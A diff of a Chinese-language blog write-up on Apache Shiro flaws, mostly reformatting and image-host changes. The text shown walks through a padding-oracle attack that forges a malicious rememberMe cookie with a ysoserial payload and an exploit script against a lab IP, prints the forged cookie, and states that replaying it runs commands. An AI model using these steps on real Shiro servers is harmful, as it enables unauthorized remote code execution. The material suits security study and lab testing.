@@ -282,8 +282,12 @@ password:
 
     通过 Padding Oracle Attack 生成 Evil Rememberme cookie:
 
-    注意： 此 exp 爆破时间较长，建议使用 ysoserial 生成较短的 payload 验证（如： ping 、 touch /tmp/test等），约 1 个多小时可生成正确的 rememberme cookie，生成成功后将自动停止运行。
+    注意： 此 exp 爆破时间较长，建议使用 ysoserial 生成较短的 payload 验证（如： ping 、 
 
+    touch /tmp/test等），约 2个多小时可生成正确的 rememberme cookie，生成成功后将自动
+    
+    停止运行。
+    
     ```shell
      #复制
      cp payload.class shiro_rce_exp/
@@ -292,16 +296,24 @@ password:
      #爆破
      python shiro_exp.py http://192.168.1.14:8080/account/ HZ717RwZHZHuR/x9yMmjJUUGWXLAOiZx01rXghAir47/Xbu++kfYFiJA7gQcSn6oaBqcRXfkihooScqykI8FEWlqmN6agAJr3bh5QH+WshypvevVnsEvUDDaSTCEX8tr3seRX8TAJfuNyvK/DD1HHYdgEKZZ9XbbimYH8S7+Xsv0uzx8PH0OuIiFX3HAofmx5y4cvRpYove0NU+/QaRwZV2LoWtAi0adC/vCHb1H2ochg5LBel6jEQakIP3AmYkEOqfRTRl/sm1olkPM+sFk6+lGw9UtDvWqCCqK5fopXV+0n4qCJlyoNyWdVEmm+mZbxekimV3QDdlC75kuyv9Utw9VtOGMdeyBttl8YrXJCJEFEdIN22LxA//iqnyGjltUEljFrZhTXXhml/V8oPVnXFOAmygIaFD6uv9rWnTtPBlLOblusyElga20ngvoMOVKTu3uYHV0Hmiw/gcnT1yT0ZosI2/fe+dzmbVNyGrwKktYjEobCZIIz/U4intWvQ77  payload.class
     ```
-
+    
+    
+    
     ![](http://pic.charo.xyz/blog/202110161948586.png)
-
+    
+    
+    
     ```shell
     #rememberMe cookies:
     Sr3FrVSmz48Tz+k5ZQxUbvAoyEOxk73bEOKUZgvK/W4U8sTEwzhUiU5YwS5HLZb5qe40REONqDBiDxiDz53NCLz7Xz57yorDiuvzRzfosivcjVjhSBfqcRGGRzEoaUGoI7LDb1Cn9pJIz/1xoyL5AcX05T2tfOwpY9u1crUWM28Xh5bY+Us50UQe7mrrDRAhefjETO7VudSkBpf7+KPVmbvPilkMuF153B/YjoAs1qQPDv2bBfS+H9BxILf4vRbhWmVLZnq/mj0t4d3MPhLV6vrtGCp0OjLFvDkPz5MlEk1uAlJjM5YZebvFR2Akei7YI4Xz0pWBs1j7cvq6f5J++ysiPC/lHtWgTY7WLcTTxxJXcGOGPT9N4KZAwpqCjQQbgm4fWGxaci778eWkTWbxqRS7nmfy/UX4P1trwloHdJhB69Pu7qorHUalpDR0YcWbiBc/VuAvOhoutKCW0LjQOjKyJsGj/6nMKTJ98ZG2sG52R5OHp7ELaB7BK+xn4v8e7KNlcCq41VMQyz++qFtDCvSB8kCfgPETF39eEVB4s2ZLwr0OQBViaeszAUIsJjCkaxYADnlt2Sy9wQ8OwSx05VdcuCWjD1q+WjWFePOoQIAxCQiJmHN8G+f609Hj4GlmNYDGsOVIl7J+JWt2ri4HEICHxeflP6e+ALb/UEYGxvRHs11VCNf35usHwyxEFD3VKGFYZ86StRK7czORGSv6jRBjOu3LsWfoHEEElQRQ8CZpSfaPahuKhrkZeVKpQ+14tllU6NtPrM64ytCTr0kXlcLJCAZF8YEy6/iYwFyVVbymNrUoE1nAF3RgzZU8WMvy/yJzFQZm87Lod50r66EC+Y2BANo2rGmo02gQIif/M8SHWXakKp6hnO9iTK37JuSRp4XakH2HubjsfvZtN8KNaAGKIGAxCMRt8w4/duMZHKrKnmoxd9CiGUHjbgj1oP29Fz3OHnqah7sZjHbAw5QZuh+6pgbkb+U9WikFQjISbsJzBm+3MRt0hN2rnbjMvBJmo6Z+FuUZYQNmLo93pDflsYhvYaKcL8Ji3KIcU1v/zC4shbe2WS1CojtV9fNAnJ8rO9cHXC4pfGkbIe1ZLckSS3JWwMtC34X+D+JVuNl6v+03sWvAjCIEoOxL5s0+kqq7QD0B9te7n47UqaAoyH6Ok6O+sTz21zp8W2oDg6iCiWA3njB3ZKp9WhPNgT1qiJcwPcH1mDFJZtMkfBcDFeOQXBr1X253IZImsPC0LkKJZBI2dkgysy0jnLs5gKa9cebfZyJQkRQuFtpa7obu+Fs40ICStzuKoIm7dtZO6Yo6dxRTNWDbZYopt53YcvtSiXVjoi3XR7Qymlm01BHLgzZvF17ANT9H5KXgjfM6Ct6xjFEfHUl+DxevS/GOeSwOzCeoBN5n9UvjopnGoZGrnRw/XaeU+3UpFb+kRI4pr60vm/J9u2KSYrvLSr573vQ7j438J9GSP9yQ0x4XeRKz6PpM4ntaqwPt8gKSPKnVkAeUPb6ocDD1O6lhg3FurZ7WgB3qj90pVzStXRzHDeTkbOCgAZzxOwoH8TuA0TkW3NVSVg1OMAspYhGDiOtFznnOc3ES8D5KzPyThas0eGvrmzPGpWLtK1cfrZEwgmndJFoK3f1rV7Y2FghM56Zl9xhFodS4Cjv9HgzRsBIMtrF57pbftvvBOoBNRvkg2WLMK2+ruzD90dNHypvBTlmyMWFVSeGGWYkeeNgCAzrWF/LpkTSfxCRwe0dhUkFXEYlYksTWZgmWU4haiIifz7+dpm/tME/BZhzbIVRYwraYYydyN34ODw/RJN+LSsL0XRFb0xPWjuIEn4Cselz1XOt/XO0D5G2NZ8vjVBp0mArwp4GtN6ISvgAAAAAAAAAAAAAAAAAAAAA=
     ```
-
-      使用Evil Rememberme cookie 认证进行反序列化攻击：复制该cookie，然后重放一下数据，即可成功执行命令
-
+    
+      
+    
+    使用Evil Rememberme cookie 认证进行反序列化攻击：复制该cookie，然后重放一下数据，即可成功执行命令
+    
+    
+    
     ![img](https://img2020.cnblogs.com/blog/1049983/202012/1049983-20201203093823489-197308072.png)
 
 
@@ -315,8 +327,11 @@ password:
     
      ls
     ```
-    
-    ![](http://r02y8mxs0.hb-bkt.clouddn.com/blog/202110161949493.png)
+
+
+
+
+![](http://pic.charo.xyz/blog/202110161949493.png)
 
 ### *Apache Shiro* 认证绕过漏洞 *CVE-2020-1957*
 
